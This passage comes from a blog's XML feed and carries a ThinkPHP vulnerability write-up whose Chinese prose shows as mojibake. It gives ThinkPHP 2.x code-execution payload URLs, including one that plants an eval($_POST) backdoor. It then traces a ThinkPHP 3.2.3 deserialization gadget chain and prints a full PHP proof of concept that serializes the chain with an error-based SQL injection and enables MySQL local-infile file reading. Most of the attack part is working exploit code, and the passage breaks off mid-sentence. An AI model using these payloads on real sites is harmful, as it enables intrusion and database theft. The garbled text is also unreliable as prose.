            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphpå„ç‰ˆæœ¬æ¼æ´åˆ†æåŠä¾‹é¢˜</title>
      <link href="/2021/12/19/Thinkphp%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
      <url>/2021/12/19/Thinkphp%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-x-ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#ThinkPHP-2-x-ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="ThinkPHP 2.x(ä»»æ„ä»£ç æ‰§è¡Œ)"></a>ThinkPHP 2.x(ä»»æ„ä»£ç æ‰§è¡Œ)</h1><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?s=/Index/index/jammny/$&#123;@phpinfo()&#125;</span><br><span class="line">http://xxx/?s=/Index/index/jammny/$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure><h1 id="Thinkphp3-2-3"><a href="#Thinkphp3-2-3" class="headerlink" title="Thinkphp3.2.3"></a>Thinkphp3.2.3</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>composer</strong>ä¸€æŠŠæ¢­,å¯å‚è€ƒ<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">æ–‡ç« </a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/thinkphp=3.2.3 tp3</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp3/</span><br></pre></td></tr></table></figure><p>å³å¯</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ‰¾èµ·ç‚¹ï¼Œ<code>\tp3\ThinkPHP\Library\Think\Image\Driver\Imagick.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/3f63862ef70f482e9c9be462a26cd782.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$this-&gt;img<strong>æ˜¯å¯æ§çš„ï¼Œè°ƒç”¨äº†</strong>destroy**å‡½æ•°ï¼Œè¿™é‡Œå…¨å±€æœç´¢ï¼Œè·Ÿè¿›åˆ°<code>\tp3\ThinkPHP\Library\Think\Session\Driver\Memcache.class.php</code>,</p><p><img src="https://img-blog.csdnimg.cn/70873ffb5d064dcda923860589d36cba.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­çš„**$this-&gt;handle<strong>å’Œ</strong>$this-&gt;sessionName<strong>æ˜¯å¯æ§çš„,ç„¶åè°ƒç”¨äº†</strong>delete**å‡½æ•°ï¼Œè·Ÿè¿›åˆ°<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/937536a6d41b4b12b9ed7ab1ac3e53a1.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>getPk</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/02aa31995b6b45b3b688518cf76b20de.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>$this-&gt;pk</strong>å¯æ§ï¼Œæ‰€ä»¥**$pk**æ˜¯å¯æ§çš„ï¼Œæ¥ç€çœ‹ä¸‹é¢</p><p><img src="https://img-blog.csdnimg.cn/b39eef92507b47ebae9efc85fdc1fe54.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†æ¬¡è°ƒç”¨<strong>delete</strong>å‡½æ•°,è¿™æ¬¡è·Ÿè¿›åˆ°<code>ThinkPHP/Library/Think/Db/Driver.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/73b5e5800c62482f8486814f77d535e4.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…³é”®çš„æ˜¯è¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><strong>$sql</strong>æ˜¯ç”±**â€™DELETE FROM â€˜<strong>ä¸</strong>$table<strong>æ‹¼æ¥è€Œæ¥çš„ï¼Œè€Œ</strong>$table<strong>ç­‰äºçš„æ˜¯è°ƒç”¨äº†</strong>parseTable**æ–¹æ³•åçš„å€¼</p><p>è·Ÿè¿›<strong>parseTable</strong>æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/0eee7cdb4a684f389409747b8f3fac32.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>parseKey</strong>æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/84ebcabf1b044f0184a20a9a1cf37b2a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç›´æ¥è¿”å›**$key<strong>ï¼Œé€€å›åˆ°<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>ä¸­çš„</strong>delete**æ–¹æ³•</p><p>æœ€åè°ƒç”¨äº†<strong>execute</strong>æ–¹æ³•å¯¹**$sql**è¿›è¡Œå¤„ç†</p><p><img src="https://img-blog.csdnimg.cn/918fcda2f0344afa852db8f80c2a483b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›ä¸€ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/bcba9ca8f977490594b9ce3d9e89aab4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>initConnect</strong>æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/40175316603e4888946b6def6d9d8c67.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>connect</strong>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/3f9cd888cb0c40b2b0a541b9a217d93e.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œä½¿ç”¨äº†**$this-&gt;config<strong>å»åˆ›å»ºæ•°æ®åº“çš„è¿æ¥ï¼Œæ‰€ä»¥åœ¨</strong>mysql**ç±»ä¸‹é…ç½®å¥½æ•°æ®åº“çš„é…ç½®å³å¯</p><p><img src="https://img-blog.csdnimg.cn/e6ee35f789194e2dac653c48cda46054.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¢³ç†ä¸€ä¸‹æ€è·¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ThinkPHP/Mode/Lite/Model.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$pk</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>();    </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]);<span class="comment">//$pkå¯æ§ï¼Œ$this-&gt;dataå¯æ§ï¼Œæ‰€ä»¥$this-&gt;data[$pk]å¯æ§</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)//è¿™é‡Œçš„$<span class="title">options</span>å°±æ˜¯ä¸Šé¢çš„$<span class="title">this</span>-&gt;<span class="title">data</span>[$<span class="title">pk</span>]ï¼Œå¯æ§</span></span><br><span class="line"><span class="function">$<span class="title">table</span> = $<span class="title">this</span>-&gt;<span class="title">parseTable</span>(<span class="params"><span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]</span>)</span>;</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span>(<span class="params"><span class="variable">$tables</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"><span class="comment">// æ”¯æŒåˆ«åå®šä¹‰</span></span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$table</span> =&gt; <span class="variable">$alias</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$table</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="variable">$array</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_walk</span>(<span class="variable">$tables</span>, <span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="string">&#x27;parseKey&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params">&amp;<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯¹äºæ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹å¯ä»¥çœ‹ä¸‹é¢çš„ä¾‹å­ï¼Œå¾ˆå¥½æ‡‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wind</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;pk;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) //è¿™é‡Œçš„$<span class="title">options</span>å°±æ˜¯ä¸Šé¢çš„$<span class="title">this</span>-&gt;<span class="title">data</span>[$<span class="title">pk</span>]ï¼Œå¯æ§</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;test sql&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params">&amp;<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span>(<span class="params"><span class="variable">$tables</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"><span class="comment">// æ”¯æŒåˆ«åå®šä¹‰</span></span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$table</span> =&gt; <span class="variable">$alias</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$table</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="variable">$array</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$tables</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_walk</span>(<span class="variable">$tables</span>, <span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="string">&#x27;parseKey&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">wind</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;test sql&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;name where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br></pre></td></tr></table></figure><p>æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p>æœ€åçš„POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–æ•°æ®åº“è¿æ¥</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,<span class="comment">//æ•°æ®åº“å</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,<span class="comment">//åœ°å€</span></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,<span class="comment">//ç«¯å£</span></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,<span class="comment">//ç”¨æˆ·å</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span><span class="comment">//å¯†ç </span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;name where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å…¥å£æ–‡ä»¶å¤„æ·»åŠ å¦‚ä¸‹ä»£ç ä»¥æµ‹è¯•,åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå°±æ˜¯å› 